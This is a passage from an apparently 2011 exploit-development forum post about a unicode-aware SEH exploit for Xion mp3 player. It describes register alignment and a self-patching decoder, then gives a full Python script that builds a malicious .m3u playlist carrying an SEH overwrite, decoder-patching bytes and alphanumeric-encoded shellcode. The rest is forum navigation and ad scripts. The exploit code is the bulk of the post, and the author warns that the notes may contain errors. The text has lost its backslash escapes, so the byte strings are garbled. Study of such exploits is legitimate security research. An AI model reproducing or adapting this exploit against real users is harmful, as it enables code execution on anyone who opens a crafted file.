// Atlast, making eax point to our shellcode( ie 1st null byte of the decoder loop)<br/>
<br/>
Finally our shellcode buffer should look like this ..<br/>
<br/>
[set ebx,ecx,eax code(unicode proof)][patch decoder(unicode proof)][actual decoder loop][shellcode]<br/>
<br/>
and eax must point to the first null byte of the actual decoder loop<br/>
<br/>
Assume atleast 1 register point to the buffer/part of it atleast<br/>
<br/>
get that value in eax using xchg eax,r32. Then add appropriate value to eax to make it point to<br/>
the 1st null byte of the actual decoder<br/>
<br/>
<b>Adding 0×200 to eax</b><br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:60px;">add eax,0×01000100
add eax,0xff000100 ; eax contains eax(old value)+0×200
;add align bytes too as this is not unicode proof</pre>
</div><b>Practical:<br/>
</b><br/>
decoder loop code:<br/>
43 8A 14 58 88 14 18 E2 F7<br/>
But when 0×88 is unicode expanded becomes 0xc602, also 0x8a becomes 0×6001 (Thanks FX for the table!!)<br/>
<br/>
Take 5 chars, when expanded become 10 chars, make a register point to the first char and overwrite it with the decoder loop<br/>
<br/>
introduce nops (short jump 0×00)<br/>
<br/>
First :<br/>
set eax to some address closer to stack<br/>
<br/>
popad makes eax — 0x0012e564<br/>
<br/>
unicode string containing A’s — 0x0012f2bc<br/>
<br/>
diff = 0xd58<br/>
<br/>
Add eax+0xd58<br/>
<br/>
Can be add byte [ebp+0x0],al [00 45 00]<br/>
for this ebp must be writable, but ebp points so close to our buffer @0x0012f2ac<br/>
lets make edi value equals ebp<br/>
done using : push edi<br/>
pop ebp<br/>
<br/>
Steps to achieve this:<br/>
Lets try this way!! zero out the least significant byte of eax<br/>
so eax=0x0012e500 , now the difference is 0xdbc<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:84px;">mov al,0×0 [b0 00]
add eax,0x01000c00
add eax,0xff000100
mov ecx,0xaa00bc00
add al,ch ;eax contains 0x0012f2bc</pre>
</div>Ok, cant write 0xbc coz it will get translated into different thing, use 0xe8(to point to our buffer) instead<br/>
so we add 0xde0 to eax<br/>
<br/>
[Warning: there might be something wrong in the notes, you never know...trust the exploit file]<br/>
<br/>
<b>[+]Exploit<br/>
</b><br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:372px;">“”"

Unicode exploit — Xion mp3 player!!
Greets:obscou,corelanc0d3r ,g4h team
“”"
“”"
Minor modification –Required (Read this!!)
In obscou’s article , the decoder contains 0×88 0x8a which will get translated
due to unicode conversion (thanks FX for that awesome unicode table..see blackhat presentation). How i managed to write 0×88 is

, mov byte [eax],0×81 coz 0×81 gets translated as 81 00 , then inc byte [eax] for 7 times to get 0×88
“”"

fd=open(“boom.m3u”,”w”)
buf=”A” * 254
buf+=”x61x62″ #ptr to next seh record(popad / add byte ptr [edx],al )
buf+=”x15x45″ #se handler (assembles as adc #eax,0×41004500 )
buf+=”A”
#shellcode building stage
buf+=”x45″ #alignment
#shellcode goes here!!!
#nseh walk corrupts eax, edx points closer to where eax was..push edx /pop eax
buf+=”x52″ #push edx
buf+=”x45″
buf+=”x58″ #pop eax
buf+=”x45″
buf+=”x57″ #push edi
buf+=”x45″ #alignment , add byte [ebp+0x0],al
buf+=”x5d” #pop ebp
buf+=”x45″ 
buf+=”x05x0cx01″ #add eax,0x01000d00 
buf+=”x45″
buf+=”x05x02xff” #add eax,0xff000100
buf+=”x45″
buf+=”xb9x70xee” #mov ecx,0xee001400 
buf+=”x45″
buf+=”xb0″ #mov al,0×0
buf+=”x46″ #inc esi , just a nop coz add al,ch is 00 e8
buf+=”xe8″ #add al,ch
buf+=”x45″
#eax points to start of buffer
#setup ebx-&gt;0×0 ecx-&gt;0×500(size of shellcode)
buf+=”x6a” #push 0×0
buf+=”x5b” #pop ebx
buf+=”x45″
buf+=”x6a” #push 0×0
buf+=”x59″ #pop ecx
buf+=”x45″
buf+=”xbax07xaa” #mov edx,0xaa000500
buf+=”x45″
buf+=”x46″ #inc esi / just a nop coz mov ch,dl assembles as 00 f5
buf+=”xf5″ #add ch,dh
buf+=”x45″
“”"
patch decoder
Assume eax points to the 43 ie first byte of the decoder!!
prob: cant use 0x8a / 0×88 directly!! thinking about add byte ptr [eax],dh / inc byte [eax] (unicode proof)
Assume eax points to the 1st byte of decoder buffer that has to be patched
“”"
buf+=”x40″ #inc eax
buf+=”x45″

#decoder : 43 8A 14 58 88 14 18 E2 F7
#user buffer 43 14 81 18 f7
buf+=”xc6x81″ #mov byte [eax],0×81
buf+=”x45″
#Now we need to increment [eax] by 9 , inc byte [eax] assembles as FE 00 
buf+=”xfe” *9 #Writes 0x8a
buf+=”x40″#inc eax
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″
buf+=”xc6x58″ # mov byte [eax],0×58
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″
#Patching the 0×88, make sure 0×81 is present at that place (userbuffer)
buf+=”xfe” *7
buf+=”x40″#inc eax
buf+=”x45″
buf+=”xc6x14″ #mov byte [eax],0×14
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″
buf+=”xc6xe2″ #mov byte [eax],0xe2
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″ # makes eax point to the start of the unicode expanded sc
buf+=”x40″#inc eax
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″
buf+=”x40″#inc eax
buf+=”x45″
buf+=”x04x04″ #nops , add al,0×0

#decoder buffer ,this is where eax must point to in the first place
buf+=”x04″ #add al,0×0 , this will act as nop
#decoder : 43 8A 14 58 88 14 18 E2 F7
buf+=”x43x14x81x18xf7″
#decoder
buf+=”x45″ #align
#shellcode ..thanks skylined for alpha2
# This is not unicode proof shellcode , just uppercase #shellcode,decoder will auto”magic”ally patch unicode to ascii
buf+=(“PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIYKO8NZYZM47R4TXYRTQ4JTQO6QO9NQPVLCO74DFQPWTT5SV7INC6HWKXVVPOB821XF6PJ0ZTL7SRYV3MOUNRLLXP1UVXYPO0IN0LXMKWPWKJFK8I589ZJSK5NJPLMXXWKNNNX1R7L3NOJVQZKKM2NOEQ9922YK0TT14R4K8SO9RL6NWTOMIVVQ2U2MQLT92M4FWJ0ZLLXKQHY6O7CPOZQLXVOPM2MMM8LLOYNCITS1X3KTM3L9XFUNDPMTHPKTBJF264KI8M4QXNXYZLJVMYOZKSNSINJUKWQRVRLN5LXONU71MELKLQ75KM0HOKIL1KGOO4WOS3KPCPPKY6KETS4VNO7JVNOYVOQDVYYJUMKKLQD4VN2TWLK2PQNOJXULNLPOKI6URKEKOYFMQJVCGRNNE3KFKUKNXKY80ENONK5HFNOU131W0NXFM9KN0HUX9YF37OU9JMQRM3KTTK4NDKOQK4OVM9J6ULPQ4QKMVPHJK5PI1OHLNJQYT5SO36KQENDK0DVV7NDL71EN1Y6U32XTWWZTH2KY2MRNV6CKZJRNDQE0OUWIT6V6OLNOSZO14VHM46MGPQF5NMSTQOV410HPCKPFKL9I9WGB0PLLLQJLTVSVPPG6YQ8UFZDNJ4DUKMQXLYRSLK84WXWZXJ8KMUOJ8ZNTKKPZQ42ONXRKROVMKYJ***OTNKSYO9TSZOLWPJLQLPU362HPZ5WXN4UYKTWQNQVM1K1QLPA”)
#trigger the exception
buf+=”E” * 5000
fd.write(buf)

print “File is created successfully”</pre>
</div>
						</blockquote>
					</div>

					
				</div>
			</div>
			
			<div class="after_content">
				
				<!-- edit note -->
				<blockquote class="postcontent lastedited">
					
						Last edited by sebas_phoenix; 10-27-2011 at <span class="time">12:59 AM</span>.
					
					
				</blockquote>
				<!-- / edit note -->
				
				
				
				
				
			</div>
			
			<div class="cleardiv"></div>
		</div>
	</div>
		<div class="postfoot">
			<!-- <div class="postfoot_container"> -->
			<div class="textcontrols floatcontainer">
				<span class="postcontrols">
					<img alt="" id="progress_6137" src="images/misc/progress.gif" style="display:none"/>
					
					
					
						<a class="newreply" href="newreply7ab3.html?do=newreply&amp;p=6137" id="qrwq_6137" rel="nofollow" title="Reply With Quote"><img alt="Reply With Quote" id="quoteimg_6137" src="clear.gif"/>  Reply With Quote</a> 
					
					
					
				</span>
				<span class="postlinking">
					
						
					

					
					
					
					

					
					

					
					
					
					
					
				</span>
			<!-- </div> -->
			</div>
		</div>
	<hr/>
</li>

		</ol>
                <div class="separator"></div>
		<div class="postlistfoot">
			
		</div>

	

</div>

<div class="noinlinemod below_postlist" id="below_postlist">
	
	<div class="pagination_bottom" id="pagination_bottom">
	
		<div class="clear"></div>
<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
	
		<span class="shade">Quick Navigation</span>
		<a class="popupctrl" href="showthreada4f5.html?t=1644"><span class="ctrlcontainer">Exploitation Techniques</span></a>
		<a class="textcontrol" href="showthreada4f5.html?t=1644#top" onclick="document.location.hash='top';return false;">Top</a>
	
	<ul class="navpopupbody popupbody popuphover">
		
		<li class="optionlabel">Site Areas</li>
		<li><a href="usercp.html">Settings</a></li>
		<li><a href="private.html">Private Messages</a></li>
		<li><a href="subscription.html">Subscriptions</a></li>
		<li><a href="online.html">Who's Online</a></li>
		<li><a href="search.html">Search Forums</a></li>
		<li><a href="forum.html">Forums Home</a></li>
		
			<li class="optionlabel">Forums</li>
			
		
			
				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
			
		
			
				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
			
		
			
				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
			
		
			
				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
			
		
			
				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
			
		
			
				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
			
		
			
				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
			
		
			
				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
			
		
			
				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
			
		
			
				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
			
		
			
				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
			
		
			
				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
			
		
			
				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
			
		
			
				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
			
		
			
				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
			
		
			
				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
			
		
			
				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
			
		
			
				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
			
		
			
				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
			
		
			
				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
			
		
			
				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
			
		
			
				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
			
		
			
				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
			
		
			
				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
			
		
			
				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
			
		
			
				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
			
		
			
				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
					<ol class="d2">
						
		
			
				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
			
		
			
					</ol>
				</li>
			
		
			
					</ol>
				</li>
			
		
			
				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
					<ol class="d1">
						
		
			
				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
			
		
			
				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
			
		
			
				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
			
		
			
				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
			
		
			
				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
			
		
			
				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
			
		
			
				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
			
		
			
				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
			
		
			
					</ol>
				</li>
			
		
		
	</ul>
</div>
<div class="clear"></div>
	</div>
</div>










<!-- next / previous links -->
<div class="navlinks">
	
	<strong>«</strong>
	<a href="showthread2771-2.html?t=1644&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
	|
	<a href="showthread614c-2.html?t=1644&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
	<strong>»</strong>
	
</div>
<!-- / next / previous links -->

<div class="thread_info" id="thread_info">
	
	
	
	
	<h4 class="threadinfohead"><span class="optiontitle">Tags for this Thread</span></h4>
	<div class="thread_info_block" id="thread_tags_list">
		<div class="inner_block">
			
			<div id="tag_list_cell">
				
		
			<a href="tags2a12.html?tag=%22exploit+media+player%22">"exploit media player"</a>, 
		
			<a href="tags3db9.html?tag=%22exploit+xion+mp3+player%22">"exploit xion mp3 player"</a>, 
		
			<a href="tags26ec.html?tag=%22exploitation+techniques%22">"exploitation techniques"</a>, 
		
			<a href="tagsc763.html?tag=%22exploiting+xion+mp3+player%22">"exploiting xion mp3 player"</a>, 
		
			<a href="tags4650.html?tag=%22media+player+exploitation%22">"media player exploitation"</a>, 
		
			<a href="tagsf21a.html?tag=%22software+exploitation%22">"software exploitation"</a>, 
		
			<a href="tagscc43.html?tag=%22using+custom+unicode+decoder%22">"using custom unicode decoder"</a>
		

<img alt="" class="inlineimg hidden" id="tag_form_progress" src="images/misc/11x11progress.gif"/>
			</div>
			<p>
				<a href="tags.html">View Tag Cloud</a>
			</p>
		</div>
	</div>
	
	<div class="options_block_container">
		
		<div class="options_block">
			<h4 class="collapse">
				<a class="collapse" href="showthreada4f5.html?t=1644#top" id="collapse_posting_rules"><img alt="" src="images/buttons/collapse_40b.png"/></a>
				<span class="optiontitle">Posting Permissions</span>
			</h4>
			<div class="thread_info_block" id="posting_rules">
				
<div class="info_subblock" id="forumrules">

	<ul class="youcandoblock">
		<li>You <strong>may not</strong> post new threads</li>
		<li>You <strong>may not</strong> post replies</li>
		<li>You <strong>may not</strong> post attachments</li>
		<li>You <strong>may not</strong> edit your posts</li>
		<li> </li>
	</ul>
	<div class="bbcodeblock">
		<ul>
			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
			<li>HTML code is <strong>Off</strong></li>
		</ul>
	</div>
	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>

</div>

			</div>
		</div>

	</div>

</div>








<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
</div>

<div class="floatcontainer footer" id="footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label=" Standard Styles">
									
					
	<option class="" selected="selected" value="1">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label=" Mobile Styles">
					
					
	<option class="" value="2">-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul class="footer_links" id="footer_links">
		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="#" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="showthreada4f5.html?t=1644#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:49 PM</span>.</div>

<div class="shade footer_copyright" id="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div class="shade footer_morecopyright" id="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>

</div></body></html>